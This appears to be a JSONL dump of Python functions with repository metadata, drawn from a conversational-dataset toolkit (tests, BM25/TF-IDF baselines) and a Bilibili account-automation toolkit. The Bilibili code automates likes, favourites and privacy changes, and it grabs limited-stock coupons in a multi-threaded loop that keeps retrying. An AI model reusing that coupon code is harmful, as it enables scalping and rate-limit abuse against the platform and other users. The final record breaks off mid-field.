{"docstring": "\"\"\"Check that it picks up threads whose parents are missing.\"\"\"\n", "func_signal": "def test_linear_paths_with_stranded_threads(self):\n", "code": "id_to_comment = {\n    \"1\": self._create_test_comment(id=\"1\", parent_id=\"unseen\"),\n    \"2\": self._create_test_comment(id=\"2\", parent_id=\"1\"),\n\n\n    \"3\": self._create_test_comment(id=\"3\", parent_id=\"unseen 2\"),\n    \"4\": self._create_test_comment(id=\"4\", parent_id=\"3\"),\n}\npaths = list(create_data.linear_paths(id_to_comment, parent_depth=100))\nself.assertItemsEqual([\n    [\"1\", \"2\"],\n    [\"3\", \"4\"],\n], paths)", "path": "conversational-datasets/reddit/create_data_test.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Format and print an individual tensorflow example.\"\"\"\n", "func_signal": "def _pretty_print_example(example):\n", "code": "_print_field(\"Context\", _get_string_feature(example, \"context\"))\n_print_field(\"Response\", _get_string_feature(example, \"response\"))\n_print_extra_contexts(example)\n_print_other_features(example)", "path": "conversational-datasets/tools/tfrutil.py", "commit_date": "2019-07-17 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Create a dummy vocabulary file.\"\"\"\n", "func_signal": "def setUpClass(cls):\n", "code": "vocab_tokens = [\n    \"[UNK]\", \"[CLS]\", \"[SEP]\", \"hello\", \"hi\",\n]\nwith tempfile.NamedTemporaryFile(delete=False) as vocab_writer:\n    vocab_writer.write(\"\".join([x + \"\\n\" for x in vocab_tokens]))\ncls.vocab_file = vocab_writer.name", "path": "conversational-datasets/baselines/vector_based_test.py", "commit_date": "2019-11-12 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Vectorize the given strings.\"\"\"\n", "func_signal": "def _vectorize(self, strings):\n", "code": "with ignore_warnings():\n    # Ignore deprecated `non_negative` warning.\n    tf_idf_vectors = self._tfidf_transform.transform(\n        self._vectorizer.transform(strings))\ntf_idf_vectors = sp.csr_matrix(\n    tf_idf_vectors, dtype=np.float64, copy=True)\n\n# Document length (number of terms) in each row\n# Shape is (n_samples, 1)\ndocument_lengths = tf_idf_vectors.sum(axis=1)\n\n# Number of non-zero elements in each row\n# Shape is (n_samples, )\nnum_terms = tf_idf_vectors.indptr[1:] - tf_idf_vectors.indptr[0:-1]\n\n# In each row, repeat `document_lengths` for `num_terms` times\n# Shape is (sum(num_terms), )\nrep = np.repeat(np.asarray(document_lengths), num_terms)\n\n# Compute BM25 score only for non-zero elements\ndata = tf_idf_vectors.data * (self._k1 + 1) / (\n    tf_idf_vectors.data + self._k1 * (\n        1 - self._b + self._b * rep / self._average_document_length))\n\nvectors = sp.csr_matrix(\n    (data, tf_idf_vectors.indices, tf_idf_vectors.indptr),\n    shape=tf_idf_vectors.shape)\nvectors = vectors * self._idf_diag\n\nreturn vectors", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Print the extra context features.\"\"\"\n", "func_signal": "def _print_extra_contexts(example):\n", "code": "extra_contexts = []\ni = 0\nwhile True:\n    feature_name = \"context/{}\".format(i)\n    try:\n        value = _get_string_feature(example, feature_name)\n    except IndexError:\n        break\n    extra_contexts.append((feature_name, value))\n    i += 1\nif not extra_contexts:\n    return\n\nprint(\"\\nExtra Contexts:\")\nfor feature_name, value in reversed(extra_contexts):\n    _print_field(feature_name, value, indent=True)", "path": "conversational-datasets/tools/tfrutil.py", "commit_date": "2019-07-17 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Rank the responses for each context.\"\"\"\n", "func_signal": "def rank_responses(self, contexts, responses):\n", "code": "contexts_matrix = self._vectorize(contexts)\nresponses_matrix = self._vectorize(responses)\nsimilarities = contexts_matrix.dot(responses_matrix.T).toarray()\nreturn np.argmax(similarities, axis=1)", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Rank the responses for each context.\"\"\"\n", "func_signal": "def rank_responses(self, contexts, responses):\n", "code": "contexts_matrix = self._vectorize(contexts)\nresponses_matrix = self._vectorize(responses)\nsimilarities = contexts_matrix.dot(responses_matrix.T).toarray()\nreturn np.argmax(similarities, axis=1)", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Check that the keyword with higher idf counts for more.\"\"\"\n", "func_signal": "def test_train_test_idf(self):\n", "code": "method = keyword_based.TfIdfMethod()\nmethod.train(\n    [\"hello how are you\", \"hello how are\"],\n    [\"hello how\", \"hello\"]\n)\npredictions = method.rank_responses(\n    [\"hello you\", \"hello you\"],\n    [\"hello\", \"you\"]\n)\nself.assertEqual(\n    list(predictions),\n    [1, 1]  # you is more informative than 'hello'.\n)", "path": "conversational-datasets/baselines/keyword_based_test.py", "commit_date": "2019-03-21 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Create a new `BM25Method` object.\"\"\"\n", "func_signal": "def __init__(self, k1=2.0, b=0.75):\n", "code": "self._k1 = k1\nself._b = b", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "# These filenames are chosen so that their hashes will cause them to\n# be put in the train and test set respectively.\n", "func_signal": "def test_run_json(self):\n", "code": "with open(path.join(self._temp_dir, \"input_train.txt\"), \"w\") as f:\n    f.write(_TRAIN_FILE.encode(\"utf-8\"))\n\nwith open(path.join(self._temp_dir, \"input_test.txt\"), \"w\") as f:\n    f.write(_TEST_FILE.encode(\"utf-8\"))\n\ncreate_data.run(argv=[\n    \"--runner=DirectRunner\",\n    \"--sentence_files={}/*.txt\".format(self._temp_dir),\n    \"--output_dir=\" + self._temp_dir,\n    \"--dataset_format=JSON\",\n    \"--num_shards_test=2\",\n    \"--num_shards_train=2\",\n    \"--min_length=4\",\n    \"--max_length=5\",\n    \"--train_split=0.5\",\n])\n\nself.assertItemsEqual(\n    [path.join(self._temp_dir, expected_file) for expected_file in\n     [\"train-00000-of-00002.json\",\n      \"train-00001-of-00002.json\"]],\n    glob(path.join(self._temp_dir, \"train-*\"))\n)\nself.assertItemsEqual(\n    [path.join(self._temp_dir, expected_file) for expected_file in\n     [\"test-00000-of-00002.json\",\n      \"test-00001-of-00002.json\"]],\n    glob(path.join(self._temp_dir, \"test-*\"))\n)\n\ntrain_examples = self._read_json_examples(\"train-*\")\nexpected_train_examples = [\n    create_data.create_example(\n        [\"AAAA\"], \"BBBB\", \"input_train.txt\"),\n    create_data.create_example(\n        [\"AAAA\", \"BBBB\"], \"CCCC\", \"input_train.txt\"),\n    create_data.create_example(\n        [\"AAAA\", \"BBBB\", \"CCCC\"], \"DDDD\", \"input_train.txt\"),\n]\nself.assertItemsEqual(\n    expected_train_examples,\n    train_examples\n)\n\ntest_examples = self._read_json_examples(\"test-*\")\nexpected_test_examples = [\n    create_data.create_example(\n        [\"aaaa\"], \"bbbb\", \"input_test.txt\"),\n    create_data.create_example(\n        [\"aaaa\", \"bbbb\"], \"cccc\", \"input_test.txt\"),\n    create_data.create_example(\n        [\"aaaa\", \"bbbb\", \"cccc\"], \"dddd\", \"input_test.txt\"),\n]\nself.assertItemsEqual(\n    expected_test_examples,\n    test_examples\n)", "path": "conversational-datasets/opensubtitles/create_data_test.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Fit the tf-idf transform and compute idf statistics.\"\"\"\n", "func_signal": "def train(self, contexts, responses):\n", "code": "self._vectorizer = HashingVectorizer()\nself._tfidf_transform = TfidfTransformer()\nself._tfidf_transform.fit(\n    self._vectorizer.transform(contexts + responses))", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Check that bm25 can correctly rank a simple example.\"\"\"\n", "func_signal": "def test_train_test_bm25(self):\n", "code": "method = keyword_based.BM25Method()\nmethod.train(\n    [\"hello how are you\", \"hello how are\"],\n    [\"hello how\", \"hello\"]\n)\npredictions = method.rank_responses(\n    [\"hello\", \"how\", \"are\"],\n    [\"are\", \"how\", \"hello\"]\n)\nself.assertEqual(\n    list(predictions),\n    [2, 1, 0]\n)", "path": "conversational-datasets/baselines/keyword_based_test.py", "commit_date": "2019-03-21 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Fit the tf-idf transform and compute idf statistics.\"\"\"\n", "func_signal": "def train(self, contexts, responses):\n", "code": "with ignore_warnings():\n    # Ignore deprecated `non_negative` warning.\n    self._vectorizer = HashingVectorizer(non_negative=True)\nself._tfidf_transform = TfidfTransformer()\ncount_matrix = self._tfidf_transform.fit_transform(\n    self._vectorizer.transform(contexts + responses))\nn_samples, n_features = count_matrix.shape\ndf = _document_frequency(count_matrix)\nidf = np.log((n_samples - df + 0.5) / (df + 0.5))\nself._idf_diag = sp.spdiags(\n    idf, diags=0, m=n_features, n=n_features\n)\ndocument_lengths = count_matrix.sum(axis=1)\nself._average_document_length = np.mean(document_lengths)\nprint(self._average_document_length)", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "# These filenames are chosen so that their hashes will cause them to\n# be put in the train and test set respectively.\n", "func_signal": "def test_run(self):\n", "code": "with open(path.join(self._temp_dir, \"input_train.txt\"), \"w\") as f:\n    f.write(_TRAIN_FILE.encode(\"utf-8\"))\n\nwith open(path.join(self._temp_dir, \"input_test.txt\"), \"w\") as f:\n    f.write(_TEST_FILE.encode(\"utf-8\"))\n\ncreate_data.run(argv=[\n    \"--runner=DirectRunner\",\n    \"--sentence_files={}/*.txt\".format(self._temp_dir),\n    \"--output_dir=\" + self._temp_dir,\n    \"--dataset_format=TF\",\n    \"--num_shards_test=2\",\n    \"--num_shards_train=2\",\n    \"--min_length=4\",\n    \"--max_length=5\",\n    \"--train_split=0.5\",\n])\n\nself.assertItemsEqual(\n    [path.join(self._temp_dir, expected_file) for expected_file in\n     [\"train-00000-of-00002.tfrecord\",\n      \"train-00001-of-00002.tfrecord\"]],\n    glob(path.join(self._temp_dir, \"train-*\"))\n)\nself.assertItemsEqual(\n    [path.join(self._temp_dir, expected_file) for expected_file in\n     [\"test-00000-of-00002.tfrecord\",\n      \"test-00001-of-00002.tfrecord\"]],\n    glob(path.join(self._temp_dir, \"test-*\"))\n)\n\ntrain_examples = self._read_examples(\"train-*\")\nexpected_train_examples = [\n    self.create_example(\n        [\"AAAA\"], \"BBBB\", \"input_train.txt\"),\n    self.create_example(\n        [\"AAAA\", \"BBBB\"], \"CCCC\", \"input_train.txt\"),\n    self.create_example(\n        [\"AAAA\", \"BBBB\", \"CCCC\"], \"DDDD\", \"input_train.txt\"),\n]\nself.assertItemsEqual(\n    expected_train_examples,\n    train_examples\n)\n\ntest_examples = self._read_examples(\"test-*\")\nexpected_test_examples = [\n    self.create_example(\n        [\"aaaa\"], \"bbbb\", \"input_test.txt\"),\n    self.create_example(\n        [\"aaaa\", \"bbbb\"], \"cccc\", \"input_test.txt\"),\n    self.create_example(\n        [\"aaaa\", \"bbbb\", \"cccc\"], \"dddd\", \"input_test.txt\"),\n]\nself.assertItemsEqual(\n    expected_test_examples,\n    test_examples\n)", "path": "conversational-datasets/opensubtitles/create_data_test.py", "commit_date": "2019-06-25 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Vectorize the given strings.\"\"\"\n", "func_signal": "def _vectorize(self, strings):\n", "code": "tf_idf_vectors = self._tfidf_transform.transform(\n    self._vectorizer.transform(strings))\nreturn sp.csr_matrix(\n    tf_idf_vectors, dtype=np.float64, copy=True)", "path": "conversational-datasets/baselines/keyword_based.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "\"\"\"Compute the number of examples in the input tfrecord file.\"\"\"\n", "func_signal": "def _size(path):\n", "code": "i = 0\nfor _ in tf.python_io.tf_record_iterator(path):\n    i += 1\nprint(i)", "path": "conversational-datasets/tools/tfrutil.py", "commit_date": "2019-07-17 00:00:00", "repo_name": "PolyAI-LDN/conversational-datasets", "stars": 1222, "license": "apache-2.0", "language": "python", "size": 182}
{"docstring": "# did = \u52a8\u6001ID\n", "func_signal": "def dynamic_like(self, did):\n", "code": "url = f\"{self.protocol}://api.vc.bilibili.com/dynamic_like/v1/dynamic_like/thumb\"\npayload = {\n    'uid': self.get_uid(),\n    'dynamic_id': did,\n    'up': 1,\n    'csrf_token': self.get_csrf(),\n}\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'Host': \"api.vc.bilibili.com\",\n    'Origin': \"https://space.bilibili.com\",\n    'Referer': \"https://space.bilibili.com/208259/\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"\u52a8\u6001{did}\u70b9\u8d5e\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u52a8\u6001{did}\u70b9\u8d5e\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# show_favourite = \u5c55\u793a[\u6211\u7684\u6536\u85cf\u5939]\n# show_bangumi = \u5c55\u793a[\u8ba2\u9605\u756a\u5267]\n# show_tag = \u5c55\u793a[\u8ba2\u9605\u6807\u7b7e]\n# show_reward = \u5c55\u793a[\u6700\u8fd1\u6295\u5e01\u7684\u89c6\u9891]\n# show_info = \u5c55\u793a[\u4e2a\u4eba\u8d44\u6599]\n# show_game = \u5c55\u793a[\u6700\u8fd1\u73a9\u8fc7\u7684\u6e38\u620f]\n", "func_signal": "def set_privacy(self, show_favourite=None, show_bangumi=None, show_tag=None, show_reward=None, show_info=None, show_game=None):\n", "code": "privacy = {\n    'fav_video': show_favourite,\n    'bangumi': show_bangumi,\n    'tags': show_tag,\n    'coins_video': show_reward,\n    'user_info': show_info,\n    'played_game': show_game,\n}\nurl = f\"{self.protocol}://space.bilibili.com/ajax/settings/getSettings?mid={self.get_uid()}\"\nheaders = {\n    'Host': \"space.bilibili.com\",\n    'Referer': f\"https://space.bilibili.com/{self.get_uid()}/\",\n}\nresponse = self._requests(\"get\", url, headers=headers)\nif response and response.get(\"status\") == True:\n    for key, value in privacy.items():\n        if response['data']['privacy'][key] == value:\n            privacy[key] = None\nelse:\n    self._log(f\"\u9690\u79c1\u8bbe\u7f6e\u83b7\u53d6\u5931\u8d25 {response}\")\n    return False\nurl = f\"{self.protocol}://space.bilibili.com/ajax/settings/setPrivacy\"\nheaders = {\n    'Host': \"space.bilibili.com\",\n    'Origin': \"https://space.bilibili.com\",\n    'Referer': f\"https://space.bilibili.com/{self.get_uid()}/\",\n}\nfail = []\nfor key, value in privacy.items():\n    if value is not None:\n        payload = {\n            key: 1 if value else 0,\n            'csrf': self.get_csrf(),\n        }\n        response = self._requests(\"post\", url, data=payload, headers=headers)\n        if not response or response.get(\"status\") != True:\n            fail.append(key)\nif not fail:\n    self._log(\"\u9690\u79c1\u8bbe\u7f6e\u4fee\u6539\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u9690\u79c1\u8bbe\u7f6e\u4fee\u6539\u5931\u8d25 {fail}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n", "func_signal": "def combo(self, aid):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/archive/like/triple\"\npayload = {\n    'aid': aid,\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"av{aid}\u4e09\u8fde\u63a8\u8350\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"av{aid}\u4e09\u8fde\u63a8\u8350\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# status = \u8ba2\u5355\u72b6\u6001\n# type = \u8ba2\u5355\u7c7b\u578b\n", "func_signal": "def mall_order_list(self, status=0, type=[2]):\n", "code": "def get_order_list(status, type):\n    headers = {\n        'Origin': \"https://mall.bilibili.com\",\n        'Referer': \"https://mall.bilibili.com/orderlist.html\",\n    }\n    order_list = []\n    page = 0\n    while True:\n        url = f\"{self.protocol}://show.bilibili.com/api/ticket/ordercenter/list?pageNum={page}&pageSize=20&status={status}&customer=0&platform=h5&v={int(time.time())}\"\n        response = self._requests(\"get\", url, headers=headers)\n        if response and response.get(\"errno\") == 0:\n            data = response['data']['list']\n            if data:\n                for order in data:\n                    if not type or order['order_type'] in type:\n                        order_list.append(order)\n                page += 1\n            else:\n                self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355\u5217\u8868\u83b7\u53d6\u6210\u529f, \u603b\u8ba1{len(order_list)}\u4e2a\u8ba2\u5355\")\n                break\n        else:\n            self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355\u5217\u8868\u83b7\u53d6\u5931\u8d25 {response}\")\n    return order_list\n\ndef get_order_detail(order_id):\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/order/detail?orderId={order_id}&platform=h5&time={int(time.time())}\"\n    headers = {\n        'Origin': \"https://mall.bilibili.com\",\n        'Referer': f\"https://mall.bilibili.com/orderdetail.html?orderId={order_id}\",\n    }\n    response = self._requests(\"get\", url, headers=headers)\n    if response and response.get(\"code\") == 0 and response['data']['vo']:\n        data = response['data']['vo']\n        self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355{order_id}\u8be6\u60c5\u83b7\u53d6\u6210\u529f, \u5305\u542b\\\"{data['skuList'][0]['itemsName']}\\\"\u7b49{len(data['skuList'])}\u4ef6\u5546\u54c1\")\n        return data\n    else:\n        self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355{order_id}\u8be6\u60c5\u83b7\u53d6\u5931\u8d25 {response}\")\n        return {}\n\ndef get_order_express(order_id):\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/order/express/detail?orderId={order_id}\"\n    headers = {\n        'Origin': \"https://mall.bilibili.com\",\n        'Referer': f\"https://mall.bilibili.com/orderdetail.html?orderId={order_id}\",\n    }\n    for _ in range(5):\n        response = self._requests(\"get\", url, headers=headers)\n        if response and response.get(\"code\") == 0 and response['data']['vo']:\n            data = response['data']['vo']\n            self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355{order_id}\u7269\u6d41\u83b7\u53d6\u6210\u529f, \u72b6\u6001\u4e3a{data['state_v']}\")\n            return data\n        time.sleep(3)\n    self._log(f\"\u4f1a\u5458\u8d2d\u8ba2\u5355{order_id}\u7269\u6d41\u83b7\u53d6\u5931\u8d25 {response}\")\n    return {}\n\norder_list = []\nfor order in get_order_list(status, type):\n    order_detail = get_order_detail(order['order_id'])\n    order_express = get_order_express(order['order_id']) if order_detail and order_detail['orderExpress'] else {}\n    order_list.append({\n        'id': order.get(\"order_id\"),\n        'item': [{\n            'id': item.get(\"itemsId\"),\n            'name': item.get(\"itemsName\"),\n            'spec': item.get(\"skuSpec\"),\n            'number': item.get(\"skuNum\"),\n            'price': item.get(\"price\"),\n        } for item in order_detail.get(\"skuList\", [])],\n        'create': time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(order.get(\"order_ctime\"))) if order.get(\"current_timestamp\") else None,\n        'status': {\n            'code': order.get(\"status\"),\n            'name': order.get(\"status_name\"),\n        },\n        'pay': {\n            'id': order_detail['orderBasic'].get(\"payId\") if order_detail.get(\"orderBasic\") else None,\n            'time': order.get(\"pay_ctime\") if order.get(\"pay_ctime\") != \"0000-00-00 00:00:00\" else None,\n            'channel': order_detail['orderBasic'].get(\"paymentChannel\") if order_detail.get(\"orderBasic\") else None,\n            'total': order.get(\"show_money\") / 100 if order.get(\"show_money\") else None,\n            'origin': order_detail['orderBasic'].get(\"payTotalMoney\") if order_detail.get(\"orderBasic\") else None,\n            'discount': order_detail['orderBasic'].get(\"discountMoneys\") if order_detail.get(\"orderBasic\") else None,\n            'express': order.get(\"express_fee\") / 100 if order.get(\"express_fee\") else None,\n        },\n        'preorder': {\n            'phone': order_detail['extData'].get(\"notifyPhoneOrigin\") if order_detail.get(\"extData\") else None,\n            'front': {\n                'total': order_detail['extData'].get(\"frontPayMoney\") if order_detail.get(\"extData\") else None,\n                'origin': order_detail['extData'].get(\"frontMoney\") if order_detail.get(\"extData\") else None,\n                'discount': order_detail['extData'].get(\"frontDisMoney\") if order_detail.get(\"extData\") else None,\n            },\n            'final': {\n                'total': order_detail['extData'].get(\"finalPayMoney\") if order_detail.get(\"extData\") else None,\n                'origin': order_detail['extData'].get(\"finalMoney\") if order_detail.get(\"extData\") else None,\n                'discount': order_detail['extData'].get(\"finalDisMoney\") if order_detail.get(\"extData\") else None,\n                'start': time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(order_detail['extData'].get(\"finalMoneyStart\") / 1E3)) if order_detail.get(\"extData\") and order_detail['extData'].get(\"finalMoneyStart\") else None,\n                'end': time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(order_detail['extData'].get(\"finalMoneyEnd\") / 1E3)) if order_detail.get(\"extData\") and order_detail['extData'].get(\"finalMoneyStart\") else None,\n            },\n        },\n        'shipping': {\n            'name': order_detail['orderDeliver'].get(\"deliverName\") if order_detail.get(\"orderDeliver\") else None,\n            'phone': order_detail['orderDeliver'].get(\"deliverPhone\") if order_detail.get(\"orderDeliver\") else None,\n            'address': order_detail['orderDeliver'].get(\"deliverAddr\") if order_detail.get(\"orderDeliver\") else None,\n            'company': order_detail['orderExpress'].get(\"com_v\") if order_detail.get(\"orderExpress\") else None,\n            'number': order_detail['orderExpress'].get(\"sno\") if order_detail.get(\"orderExpress\") else None,\n            'status': order_express.get(\"state_v\"),\n            'detail': order_express.get(\"detail\"),\n        },\n    })\nself.__push_to_queue(\"mall_order_list\", order_list)\nreturn order_list", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n", "func_signal": "def favour(self, aid):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/v2/fav/folder\"\nheaders = {'Host': \"api.bilibili.com\"}\nresponse = self._requests(\"get\", url, headers=headers)\nif response and response.get(\"data\"):\n    fid = response['data'][0]['fid']\nelse:\n    self._log(\"fid\u83b7\u53d6\u5931\u8d25\")\n    return False\nurl = f\"{self.protocol}://api.bilibili.com/x/v2/fav/video/add\"\npayload = {\n    'aid': aid,\n    'fid': fid,\n    'jsonp': \"jsonp\",\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"av{aid}\u6536\u85cf\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"av{aid}\u6536\u85cf\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# coupon_id = \u4f18\u60e0\u5238ID\n# thread = \u7ebf\u7a0b\u6570\n", "func_signal": "def mall_coupon(self, coupon_id, thread=1):\n", "code": "def get_coupon_info(coupon_id):\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/coupon/user_coupon_code_receive_status_list\"\n    payload = {\n        'couponIds': [str(coupon_id)],\n        'mid': \"\",\n        'csrf': self.get_csrf(),\n    }\n    headers = {\n        'Host': \"mall.bilibili.com\",\n        'Origin': \"https://www.bilibili.com\",\n    }\n    response = self._requests(\"post\", url, json=payload, headers=headers)\n    if response and response.get(\"code\") == 0:\n        return {\n            'end': response['data'][0]['receiveEndTime'],\n            'message': response['data'][0]['couponStatusMsg'],\n            'name': response['data'][0]['couponName'],\n            'total': response['data'][0]['provideNum'],\n            'remain': response['data'][0]['remainNum'],\n            'start': response['data'][0]['receiveStartTime'],\n            'status': response['data'][0]['receiveStatus'],\n        }\n\ndef get_server_time(target_time=0):\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/common/time/remain?v={int(time.time())}&targetTime={target_time}\"\n    headers = {\n        'Host': \"mall.bilibili.com\",\n        'Origin': \"https://www.bilibili.com\",\n    }\n    response = self._requests(\"get\", url, headers=headers)\n    if response and response.get(\"code\") == 0:\n        return {\n            'current': response['data']['serverTime'],\n            'remain': response['data']['remainSeconds'],\n        }\n\ndef executor(thread_id):\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/coupon/create_coupon_code?couponId={coupon_id}&deviceId=\"\n    payload = {'csrf': self.get_csrf()}\n    headers = {\n        'Host': \"mall.bilibili.com\",\n        'Origin': \"https://www.bilibili.com\",\n    }\n    nonlocal flag\n    while not flag:\n        response = self._requests(\"post\", url, json=payload, headers=headers)\n        if response and response.get(\"code\") is not None:\n            if response['code'] == 83094004:\n                self._log(f\"(\u7ebf\u7a0b{thread_id})\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id})\u9886\u53d6\u6210\u529f\")\n            elif response['code'] == 83110005:\n                self._log(f\"(\u7ebf\u7a0b{thread_id})\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id})\u9886\u53d6\u5931\u8d25, \u4f18\u60e0\u5238\u9886\u53d6\u6570\u91cf\u5df2\u8fbe\u5230\u4e0a\u9650\")\n            elif response['code'] == 83110015:\n                self._log(f\"(\u7ebf\u7a0b{thread_id})\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id})\u9886\u53d6\u5931\u8d25, \u4f18\u60e0\u5238\u5e93\u5b58\u4e0d\u8db3\")\n            else:\n                continue\n        else:\n            self._log(f\"(\u7ebf\u7a0b{thread_id})\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id})\u9886\u53d6\u5931\u8d25, \u5f53\u524dIP\u8bf7\u6c42\u8fc7\u4e8e\u9891\u7e41\")\n        flag = True\n\ncoupon_info = get_coupon_info(coupon_id)\nif coupon_info:\n    if coupon_info['message'] == \"\u53ef\u9886\u53d6\":\n        server_time = get_server_time(coupon_info['start'])\n        if server_time:\n            delay = max(server_time['remain'] - 3, 0)\n            self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id})\u53ef\u9886\u53d6\u65f6\u95f4\u4e3a{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon_info['start']))}\u81f3{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon_info['end']))}, \u5e93\u5b58{coupon_info['remain']}\u5f20, \u5c06\u4e8e{delay}\u79d2\u540e\u5f00\u59cb\u9886\u53d6\")\n            time.sleep(delay)\n        else:\n            self._log(f\"\u4f1a\u5458\u8d2d\u670d\u52a1\u5668\u65f6\u95f4\u83b7\u53d6\u5931\u8d25\")\n            return\n    else:\n        self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377\\\"{coupon_info['name']}\\\"(ID={coupon_id}){coupon_info['message']}\")\n        return\nelse:\n    self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5377{coupon_id}\u4fe1\u606f\u83b7\u53d6\u5931\u8d25\")\n    return\nflag = False\nthreads = []\nfor i in range(thread):\n    threads.append(threading.Thread(target=executor, args=(i + 1,)))\nfor thread in threads:\n    thread.start()\nfor thread in threads:\n    thread.join()", "path": 